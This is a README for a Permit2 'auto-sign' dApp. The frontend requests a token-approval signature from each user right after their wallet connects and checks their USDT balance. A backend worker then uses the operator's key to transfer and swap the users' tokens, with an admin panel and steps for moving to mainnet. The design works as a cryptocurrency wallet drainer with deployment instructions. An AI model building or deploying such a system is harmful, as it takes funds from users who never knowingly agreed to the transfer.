# Permit2 Auto-Sign DApp (AppKit + Ethers)

Minimal dApp that:
- Uses Reown AppKit to open wallet modal and connect
- Configured for **Sepolia Testnet** by default
- Requests a Permit2 typed-data signature immediately after connect
- Detects USDT balance on testnet (same as mainnet behavior)
- Stores signature components in Firestore
- A backend worker (node) watches Firestore and executes transferFrom using the spender's key

## Quickstart

1. **Setup Firebase:**
   - Create a Firebase project at https://console.firebase.google.com
   - Enable Firestore Database
   - Copy your Firebase Web SDK config
   - Deploy Firestore security rules: `firebase deploy --only firestore:rules`

2. **Configure Environment:**
   - Copy `.env.example` to `.env` (for frontend)
   - Copy `functions/.env.example` to `functions/.env` (for backend)
   - Fill in your Firebase config (same credentials for both!)

3. **Install Dependencies:**
   - Frontend: `npm install`
   - Backend: `cd functions && npm install`

4. **Start the Apps:**
   - Frontend: `npm run dev`
   - Backend: `cd functions && npm start`
   
The worker will monitor Firestore for new signatures and execute transfers automatically.

## Network Configuration

### Frontend (User-Facing App)

The app is configured for **Sepolia Testnet** by default:
- Network: Sepolia (Chain ID: 11155111)
- USDT Token Address: `0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0`
- Permit2 Contract: `0x000000000022D473030F116dDEE9F6B43aC78BA3` (same on all networks)
- The app will detect USDT balance on testnet just like on mainnet

To switch to mainnet:
1. Change `sepolia` to `mainnet` in `src/App.jsx`
2. Update `VITE_TOKEN_ADDRESS` in `.env` to mainnet USDT: `0xdAC17F958D2ee523a2206206994597C13D831ec7`

### Backend (Executor/Admin Worker)

The backend executor is **ALSO configured for Sepolia Testnet** by default:
- RPC URL: `https://rpc.sepolia.org` (Sepolia testnet)
- Universal Router: `0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD` (Sepolia)
- Executor Address: `0xb1f02c288ae708de5e508021071b775c944171e8` (testnet wallet)
- Output Token (WETH): `0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14` (Sepolia WETH)

## How the Executor Works

### Architecture Flow:

```
User Wallet → Signs Permit2 → Firestore → Backend Worker → Executes Transfer
    (Frontend)                  (Database)    (Admin/Executor)    (On-chain)
```

### Step-by-Step Process:

1. **User Signs Permit** (Frontend)
   - User connects wallet on Sepolia testnet
   - Signs a Permit2 typed message authorizing the executor
   - Signature saved to Firestore `permit2_signatures` collection

2. **Worker Monitors Firestore** (Backend)
   - Runs continuously checking for unprocessed signatures
   - Validates each signature (deadline, required fields)
   - Checks executor wallet has enough ETH for gas

3. **Executor Processes Transaction** (Backend)
   - Loads executor private key from environment variables
   - Builds Universal Router transaction with:
     - `PERMIT2_PERMIT` command (validates signature on-chain)
     - `V3_SWAP_EXACT_IN` command (swaps tokens via Uniswap V3)
   - Executes transaction on Sepolia testnet
   - Updates Firestore document with transaction hash

4. **Admin Dashboard** (Frontend - `/admin`)
   - View all pending signatures
   - Monitor executor wallet balance
   - Manually trigger execution
   - Configure executor settings in real-time

### Key Security Features:

- **Executor Isolation**: The executor wallet only needs ETH for gas fees
- **Signature Validation**: All permits are validated on-chain via Permit2
- **Balance Checks**: Worker checks token balances before executing
- **Error Handling**: Failed transactions are logged with error messages
- **Testnet First**: Safe testing environment before mainnet deployment

### Executor Requirements:

1. **Testnet ETH**: Executor wallet needs Sepolia ETH for gas
   - Get from: https://sepoliafaucet.com/
   - Minimum: 0.001 ETH (configurable via `MIN_ETH_REQUIRED`)

2. **Private Key**: Must be stored securely in `functions/.env`
   - ⚠️ NEVER commit private keys to git
   - ⚠️ Use different keys for testnet and mainnet

3. **Firebase Configuration**: Uses Firebase Web SDK (not Admin SDK)
   - Same credentials as frontend
   - Copy all `VITE_FIREBASE_*` variables to `functions/.env`
   - Requires proper Firestore security rules

4. **Firestore Security Rules**: Must allow backend read/write
   - Deploy rules: `firebase deploy --only firestore:rules`
   - See [firestore.rules](firestore.rules) for configuration

### Testnet Addresses:

| Contract | Address | Network |
|----------|---------|---------|
| Permit2 | `0x000000000022D473030F116dDEE9F6B43aC78BA3` | All Networks |
| Universal Router | `0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD` | Sepolia |
| Sepolia WETH | `0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14` | Sepolia |
| Sepolia USDT | `0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0` | Sepolia |

## Switching to Mainnet

To run on mainnet, update both frontend AND backend:

### Frontend:
1. `src/App.jsx`: Change `sepolia` to `mainnet`
2. `.env`: Update `VITE_TOKEN_ADDRESS` to mainnet USDT

### Backend:
1. `functions/worker.js`: Change `UNIVERSAL_ROUTER` to mainnet address
2. `functions/.env`: Update:
   - `RPC_URL=https://cloudflare-eth.com` (or your mainnet RPC)
   - `EXECUTOR_ADDRESS` (mainnet executor wallet)
   - `EXECUTOR_PRIVATE_KEY` (mainnet private key - SECURE!)
   - `OUTPUT_TOKEN` (mainnet WETH: `0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2`)

### Server:
Similar changes apply to `server/index.js` if using the server instead of functions/worker.

## Admin Panel

Access at `/admin` to:
- View all signatures and their processing status
- Monitor executor wallet balances (ETH + tokens)
- Manually trigger transaction execution
- Update executor configuration in real-time
- View transaction history and errors

## Notes / Security
- The backend **must** hold the spender private key. Keep it secret.
- App is configured for testnet by default for safe testing.
- Frontend and backend must be on the SAME network (both testnet or both mainnet)
- Test thoroughly on testnet before deploying to mainnet.
- This project is intentionally minimal. Add robust validation, error handling, and logging for production.
- Monitor executor wallet balance to ensure gas availability.


